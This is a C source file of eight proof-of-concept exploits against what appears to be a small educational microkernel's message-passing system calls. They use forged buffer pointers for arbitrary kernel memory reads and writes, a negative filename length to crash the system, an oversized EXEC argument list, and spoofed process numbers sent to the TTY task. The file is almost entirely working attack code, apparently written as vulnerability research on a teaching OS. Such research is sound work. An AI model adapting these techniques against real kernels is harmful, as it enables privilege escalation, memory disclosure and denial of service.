#include "type.h"
#include "cmd_head.h"
#include "stdio.h"

int poc1() // 任意地址写
{
    // 1. 创建并写入文件
    int fd = open("poc1file", O_CREAT | O_RDWR);
    if (fd < 0)
    {
        printf("fail! fd=%d\n", fd);
        return -1;
    }
    char payload[] = "1234567890";
    write(fd, payload, strlen(payload));
    close(fd);

    // 2. 重新打开文件用于读取
    fd = open("poc1file", O_RDWR);
    // 准备利用的缓冲区指针 (计算使 va2la 溢出)
    unsigned int seg_base = 0xc00000; // 假定当前进程段基址为0xA00000
    unsigned int target_addr = 0x0;   // 目标内核地址
    unsigned int evil_offset = (unsigned int)(target_addr - seg_base + 1 + 0xffffffff);
    char *evil_buf = (char *)evil_offset; // 伪造缓冲区指针
    int nbytes = strlen(payload);         // 读取字节数
    printf("hacking 0x%x...\n", nbytes, target_addr);
    // 3. 触发读取漏洞
    int ret = read(fd, evil_buf, nbytes);
    printf("ret=%d\n", ret);
    close(fd);
    return 0;
}

int poc2() // 触发系统崩溃重启
{
    MESSAGE msg;
    char path[] = "poc2_test";
    memset(&msg, 0, sizeof(msg));
    msg.type = OPEN;
    msg.FLAGS = O_RDWR | O_CREAT;
    msg.PATHNAME = path;
    msg.NAME_LEN = -1; // 恶意设置文件名长度为负值
    printf("hacking...NAME_LEN=%d...\n", msg.NAME_LEN);
    send_recv(BOTH, TASK_FS, &msg);
    // 如果漏洞触发，系统将在phys_copy时崩溃，通常无法执行到下一行
    printf("ret:%d,errorcode:%d\n", msg.type, msg.RETVAL);
    return 0;
}

unsigned char elf_header[52] = {
    0x7F, 'E', 'L', 'F',                // e_ident魔数
    1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, // e_ident其余字段
    2, 0, 3, 0,                         // e_type=ET_EXEC(2), e_machine=EM_386(3)
    1, 0, 0, 0,                         // e_version=1
    0, 0, 0, 0,                         // e_entry=0
    52, 0, 0, 0,                        // e_phoff=52 (紧接header无程序段)
    0, 0, 0, 0,                         // e_shoff=0
    0, 0, 0, 0,                         // e_flags=0
    52, 0, 32, 0,                       // e_ehsize=52, e_phentsize=32
    0, 0, 0, 0, 0, 0                    // e_phnum=0, e_shentsize=0, e_shnum=0, e_shstrndx=0
};
int poc3()
{
    // 1. 准备伪造的可执行文件
    int fd = open("dummy", O_CREAT | O_RDWR);
    write(fd, elf_header, sizeof(elf_header));
    close(fd);
    // 2. 构造超大参数列表
    static char arg_buf[1208];
    // 在缓冲开头放置参数指针数组，[0]指向字符串，[1]为NULL
    char *arg0 = arg_buf + 8;
    *((unsigned int *)arg_buf) = (unsigned int)arg0;
    *((unsigned int *)(arg_buf + 4)) = 0;
    // 填充一个超长字符串参数 "AAAA..."
    memset(arg_buf + 8, 'A', 1199);
    arg_buf[8 + 1199] = 0; // 字符串结尾
    // 3. 构造EXEC调用消息
    MESSAGE msg;
    memset(&msg, 0, sizeof(msg));
    msg.type = EXEC;
    msg.PATHNAME = "dummy"; // 要执行的文件
    msg.NAME_LEN = strlen("dummy");
    msg.BUF = arg_buf;      // 参数表缓冲区首地址
    msg.BUF_LEN = 8 + 1200; // 参数总长度（>1024）
    printf("发送EXEC调用: 文件名长度=%d, 参数总长度=%d\n", msg.NAME_LEN, msg.BUF_LEN);
    send_recv(BOTH, TASK_MM, &msg);
    printf("EXEC返回: %d (RETVAL=%d)\n", msg.type, msg.RETVAL);
    return 0;
}

int poc4()
{
    int dev_fd = open("80.img", O_RDWR); // 打开硬盘设备（假设设备文件路径）
    if (dev_fd < 0)
    {
        printf("打开硬盘设备失败\n");
        return -1;
    }
    unsigned int seg_base = 0xA00000; // 根据当前进程，猜测段基址
    unsigned int target = 0x10000;
    unsigned int evil_ptr = (unsigned int)(target - seg_base);
    char *evil_buf = (char *)evil_ptr;
    printf("从硬盘读取512字节到内核地址0x%x...\n", target);
    read(dev_fd, evil_buf, 512);
    close(dev_fd);
    return 0;
}

int poc5()
{
    int child = fork();
    if (child == 0)
    {
        // 子进程B：发送消息
        MESSAGE msg;
        memset(&msg, 0, sizeof(msg));
        strcpy((char *)&msg.u.m3, "BEEP"); // 将payload填入消息的m3段
        msg.type = 99;                     // 自定义消息类型
        printf("子进程发送消息: payload=\"BEEP\"\n");
        send_recv(SEND, getpid(), &msg);
        // 子进程发送后自行退出
        return 0;
    }
    else if (child > 0)
    {
        // 父进程A：接收消息（指针伪造）
        unsigned int seg_base = 0xA00000; // 假设父进程段基址
        unsigned int target = 0x10000;    // 目标写入地址
        unsigned int evil_ptr = target - seg_base;
        MESSAGE *evil_msg = (MESSAGE *)evil_ptr;
        printf("父进程等待来自子进程的消息，接收缓冲区指向0x%x...\n", target);
        send_recv(RECEIVE, child, evil_msg);
        printf("父进程收到消息:type=%d\n", evil_msg->type);
        // 正常情况下不会执行到此；如漏洞触发，内核已将消息写入0x10000处
        return 0;
    }
    else
    {
        printf("fork失败\n");
        return -1;
    }
}


int poc6()
{
    int child = fork();
    if (child == 0)
    {
        // 子进程B：先行发送消息（指针伪造）
        unsigned int seg_base = 0xA00000; // 子进程段基址假定
        unsigned int target = 0x10000;    // 要读取的内核地址
        unsigned int evil_ptr = target - seg_base;
        MESSAGE *evil_msg = (MESSAGE *)evil_ptr;
        // 注意：不需真正填充payload，内核会从target地址读取64字节作为消息内容
        evil_msg->type = 0;
        printf("子进程发送伪造消息，请求读取内核0x%x处数据...\n", target);
        send_recv(SEND, getppid(), evil_msg);
        return 0;
    }
    else if (child > 0)
    {
        // 父进程A：稍作等待再接收
        for (int i = 0; i < 1000000; i++)
            ; // 简单延迟
        MESSAGE msg;
        printf("父进程准备接收来自任意进程的消息...\n");
        send_recv(RECEIVE, ANY, &msg);
        printf("父进程收到消息，来源=%d，类型=%d\n", msg.source, msg.type);
        // 此时msg内容其实是内核0x10000处64字节数据，msg的字段可据此解析
        return 0;
    }
    else
    {
        printf("fork失败\n");
        return -1;
    }
}

int poc7()
{
    MESSAGE msg;
    msg.type = DEV_WRITE;
    msg.DEVICE = 0;             // 假设使用第0号TTY设备
    msg.PROC_NR = 0;            // 伪装来源进程为TASK 0 (HD任务)
    msg.BUF = (void*)0x10000;   // 要泄露的内存地址
    msg.CNT = 64;               // 读取64字节
    printf("发送DEV_WRITE请求读取内核0x10000处数据...\n");
    send_recv(BOTH, TASK_TTY, &msg);
    printf("DEV_WRITE返回类型: %d\n", msg.type);
    return 0;
}

int poc8() {
    MESSAGE msg;
    msg.type = DEV_READ;
    msg.DEVICE = 0;             // TTY设备0
    msg.PROC_NR = 0;            // 伪装为TASK 0
    msg.BUF = (void*)0x10000;   // 目标写入地址
    msg.CNT = 3;                // 读取3个字符
    printf("发送DEV_READ请求（目标0x10000，长度3），请在控制台输入3个字符...\n");
    send_recv(BOTH, TASK_TTY, &msg);
    if(msg.type == SUSPEND_PROC) {
        // 理论上TTY首先返回SUSPEND_PROC，等待输入完成后再RESUME
        printf("进程挂起，等待TTY输入完成。\n");
        // 再次接收TTY的恢复消息
        send_recv(RECEIVE, TASK_TTY, &msg);
    }
    if(msg.type == RESUME_PROC) {
        printf("TTY输入完毕，内核地址0x10000已写入指定数据。\n");
    } else {
        printf("TTY读返回类型: %d\n", msg.type);
    }
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("usage: %s <poc_id>\n", argv[0]);
        return 1;
    }

    switch (argv[1][0] - '0')
    {
    case 1:
        poc1();
        break;
    case 2:
        poc2();
        break;
    case 3:
        poc3();
        break;
    case 4:
        poc4();
        break;
    case 5:
        poc5();
        break;
    case 6:
        poc6();
        break;
    case 7:
        poc7();
        break;
    case 8:
        poc8();
        break;
    default:
        printf("invalid poc\n");
        break;
    }

    return 0;
}
